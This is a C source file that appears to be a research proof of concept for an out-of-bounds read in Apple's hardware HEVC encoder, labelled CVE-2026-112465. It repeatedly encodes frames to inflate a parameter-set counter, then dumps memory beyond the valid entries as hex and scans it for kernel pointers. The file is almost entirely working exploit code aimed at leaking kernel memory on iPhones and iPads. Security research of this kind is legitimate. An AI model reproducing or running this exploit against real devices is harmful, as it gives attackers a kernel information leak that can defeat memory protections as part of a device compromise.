/*
 * ave_oob_read_ipad.c — CVE-2026-112465 OOB Read Test (iPad-compatible)
 *
 * Tests whether HEVC parameter set counter inflation allows OOB reads
 * via CMVideoFormatDescriptionGetHEVCParameterSetAtIndex.
 *
 * This does NOT require MV-HEVC — works on any device with hardware HEVC.
 * Standard HEVC encoder also generates VPS+SPS+PPS NAL units per encode,
 * incrementing the same counter that MV-HEVC uses.
 *
 * Build: xcrun -sdk iphoneos clang -arch arm64e -miphoneos-version-min=17.0
 *        -framework VideoToolbox -framework CoreVideo -framework CoreMedia
 *        -framework CoreFoundation -o AVEOOBReadIPad ave_oob_read_ipad.c
 *
 * Bundle ID: com.research.aveoobreadipad
 */

#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <CoreFoundation/CoreFoundation.h>
#include <VideoToolbox/VideoToolbox.h>
#include <CoreVideo/CoreVideo.h>

static volatile int g_done = 0;
static volatile OSStatus g_status = -999;
static volatile size_t g_pset_count = 0;
static volatile size_t g_pset_bytes = 0;
static CMFormatDescriptionRef g_fmt = NULL;

static void cb(void *ctx, void *src, OSStatus status,
               VTEncodeInfoFlags flags, CMSampleBufferRef buf) {
    g_status = status;
    g_done = 1;
    if (buf && status == 0) {
        CMFormatDescriptionRef fmt = CMSampleBufferGetFormatDescription(buf);
        if (fmt) {
            size_t count = 0;
            CMVideoFormatDescriptionGetHEVCParameterSetAtIndex(
                fmt, 0, NULL, NULL, &count, NULL);
            g_pset_count = count;
            size_t total = 0;
            for (size_t i = 0; i < count && i < 1000; i++) {
                size_t sz = 0;
                CMVideoFormatDescriptionGetHEVCParameterSetAtIndex(
                    fmt, i, NULL, &sz, NULL, NULL);
                total += sz;
            }
            g_pset_bytes = total;
            if (g_fmt) CFRelease(g_fmt);
            g_fmt = (CMFormatDescriptionRef)CFRetain(fmt);
        }
    }
}

static CVPixelBufferRef make_pb(int w, int h) {
    CVPixelBufferRef pb = NULL;
    CFMutableDictionaryRef a = CFDictionaryCreateMutable(
        NULL, 0, &kCFTypeDictionaryKeyCallBacks, &kCFTypeDictionaryValueCallBacks);
    CFDictionaryRef io = CFDictionaryCreate(NULL, NULL, NULL, 0,
        &kCFTypeDictionaryKeyCallBacks, &kCFTypeDictionaryValueCallBacks);
    CFDictionarySetValue(a, kCVPixelBufferIOSurfacePropertiesKey, io);
    CVPixelBufferCreate(NULL, w, h, kCVPixelFormatType_32BGRA, a, &pb);
    CFRelease(io); CFRelease(a);
    if (pb) {
        CVPixelBufferLockBaseAddress(pb, 0);
        void *base = CVPixelBufferGetBaseAddress(pb);
        if (base) memset(base, 0x42, w * h * 4);
        CVPixelBufferUnlockBaseAddress(pb, 0);
    }
    return pb;
}

static int encode_one(VTCompressionSessionRef s, int idx, int w, int h) {
    CVPixelBufferRef pb = make_pb(w, h);
    if (!pb) return -1;
    g_done = 0;
    CMTime pts = CMTimeMake(idx, 30);
    CMTime dur = CMTimeMake(1, 30);
    OSStatus st = VTCompressionSessionEncodeFrame(s, pb, pts, dur, NULL, NULL, NULL);
    CVPixelBufferRelease(pb);
    if (st != noErr) return (int)st;
    for (int t = 0; t < 100 && !g_done; t++) usleep(10000);
    return g_done ? (int)g_status : -2;
}

int main(int argc, char *argv[]) {
    int encodes = (argc > 1) ? atoi(argv[1]) : 300;
    if (encodes < 10) encodes = 300;

    printf("AVE OOB Read Test (iPad-compatible, standard HEVC)\n");
    printf("Encodes: %d (counter should reach ~%d entries)\n\n", encodes, encodes * 3);
    fflush(stdout);

    /* Create standard HEVC encoder (no MV-HEVC layer IDs) */
    VTCompressionSessionRef session = NULL;
    CFMutableDictionaryRef spec = CFDictionaryCreateMutable(
        NULL, 0, &kCFTypeDictionaryKeyCallBacks, &kCFTypeDictionaryValueCallBacks);
    CFDictionarySetValue(spec, CFSTR("EnableHardwareAcceleratedVideoEncoder"),
                         kCFBooleanTrue);
    CFDictionarySetValue(spec, CFSTR("RequireHardwareAcceleratedVideoEncoder"),
                         kCFBooleanTrue);

    OSStatus st = VTCompressionSessionCreate(NULL, 128, 128,
        kCMVideoCodecType_HEVC, spec, NULL, NULL, cb, NULL, &session);
    CFRelease(spec);
    if (st != noErr || !session) {
        printf("FAILED: encoder creation error %d\n", (int)st);
        return 1;
    }

    VTSessionSetProperty(session, kVTCompressionPropertyKey_RealTime, kCFBooleanTrue);
    int kf = 1;
    CFNumberRef kfn = CFNumberCreate(NULL, kCFNumberIntType, &kf);
    VTSessionSetProperty(session, kVTCompressionPropertyKey_MaxKeyFrameInterval, kfn);
    CFRelease(kfn);
    VTSessionSetProperty(session, kVTCompressionPropertyKey_AllowFrameReordering,
                         kCFBooleanFalse);

    printf("Encoder created OK (standard HEVC, hardware-accelerated)\n\n");

    /* Phase 1: First encode — baseline pset count */
    st = encode_one(session, 0, 128, 128);
    if (st != 0) {
        printf("First encode FAILED: %d\n", (int)st);
        return 1;
    }
    size_t baseline = g_pset_count;
    printf("Baseline: pset_count=%zu, bytes=%zu\n", baseline, g_pset_bytes);
    printf("(Standard HEVC should have 3 psets: VPS, SPS, PPS)\n\n");
    fflush(stdout);

    if (baseline < 2) {
        printf("WARNING: pset_count=%zu < 3 — counter may not inflate with standard HEVC\n", baseline);
        printf("The VPS table counter may only increment for MV-HEVC encodes.\n");
        printf("Continuing anyway to verify...\n\n");
    }

    /* Phase 2: Encode many frames to inflate counter */
    printf("Inflating counter with %d encodes...\n", encodes);
    size_t max_count = baseline, max_bytes = g_pset_bytes;
    int errors = 0;
    for (int i = 1; i < encodes; i++) {
        st = encode_one(session, i, 128, 128);
        if (st != 0) { errors++; continue; }
        if (g_pset_count > max_count) max_count = g_pset_count;
        if (g_pset_bytes > max_bytes) max_bytes = g_pset_bytes;
        if ((i + 1) % 50 == 0) {
            printf("[%d/%d] psets=%zu (max=%zu) bytes=%zu (max=%zu) errors=%d\n",
                   i + 1, encodes, g_pset_count, max_count, g_pset_bytes, max_bytes, errors);
            fflush(stdout);
        }
    }
    VTCompressionSessionCompleteFrames(session, kCMTimeInvalid);
    usleep(500000);

    printf("\nPost-inflation: pset_count=%zu (baseline=%zu, max=%zu)\n",
           g_pset_count, baseline, max_count);
    printf("Post-inflation: pset_bytes=%zu (max=%zu)\n\n", g_pset_bytes, max_bytes);

    if (max_count <= baseline) {
        printf("*** COUNTER DID NOT INFLATE ***\n");
        printf("Standard HEVC counter stays at baseline=%zu.\n", baseline);
        printf("The VPS table counter only increments for MV-HEVC.\n");
        printf("OOB read requires MV-HEVC hardware (iPhone 15 Pro+).\n");
        goto done;
    }

    printf("*** COUNTER INFLATED: %zu → %zu (delta: %zu) ***\n",
           baseline, max_count, max_count - baseline);

    if (max_count > 256) {
        printf("*** COUNTER PAST 256 — OOB entries in readback range ***\n\n");
    }

    /* Phase 3: Dump all parameter sets from last format description */
    if (!g_fmt) {
        printf("No format description captured\n");
        goto done;
    }

    printf("--- RAW PARAMETER SET DUMP ---\n\n");
    size_t count = 0;
    CMVideoFormatDescriptionGetHEVCParameterSetAtIndex(g_fmt, 0, NULL, NULL, &count, NULL);
    printf("Readable psets: %zu (baseline was %zu)\n\n", count, baseline);

    for (size_t i = 0; i < count && i < 500; i++) {
        const uint8_t *ptr = NULL;
        size_t sz = 0;
        int nal_hdr = 0;
        OSStatus rs = CMVideoFormatDescriptionGetHEVCParameterSetAtIndex(
            g_fmt, i, &ptr, &sz, NULL, &nal_hdr);
        if (rs != 0) {
            if (i < baseline + 5 || i > count - 5)
                printf("  [%zu] ERROR: %d\n", i, (int)rs);
            continue;
        }
        const char *label = (i < baseline) ? "" : " *** OOB ***";
        printf("  [%zu] nal_hdr=%d size=%zu%s\n", i, nal_hdr, sz, label);

        if (ptr && sz > 0 && (i < baseline + 10 || i >= count - 5 || sz > 100)) {
            size_t dump = (sz > 128) ? 128 : sz;
            printf("    ");
            for (size_t j = 0; j < dump; j++) {
                printf("%02x", ptr[j]);
                if ((j + 1) % 32 == 0) printf("\n    ");
                else if ((j + 1) % 8 == 0) printf(" ");
            }
            if (dump < sz) printf("... (%zu more)", sz - dump);
            printf("\n");

            /* Scan for kernel pointers: 0xfffffe00XXXXXXXX */
            if (sz >= 8) {
                for (size_t j = 0; j <= sz - 8; j += 4) {
                    uint64_t qw = *(const uint64_t *)(ptr + j);
                    if ((qw >> 40) == 0xfffffe) {
                        printf("    *** KERNEL PTR at byte %zu: 0x%016llx ***\n",
                               j, (unsigned long long)qw);
                    }
                }
            }
        }
        fflush(stdout);
    }

    printf("\nSummary: %zu total psets, %zu baseline, %zu OOB entries readable\n",
           count, baseline, count > baseline ? count - baseline : 0);

done:
    VTCompressionSessionInvalidate(session); CFRelease(session);
    if (g_fmt) { CFRelease(g_fmt); g_fmt = NULL; }
    printf("\nDone.\n");
    return 0;
}
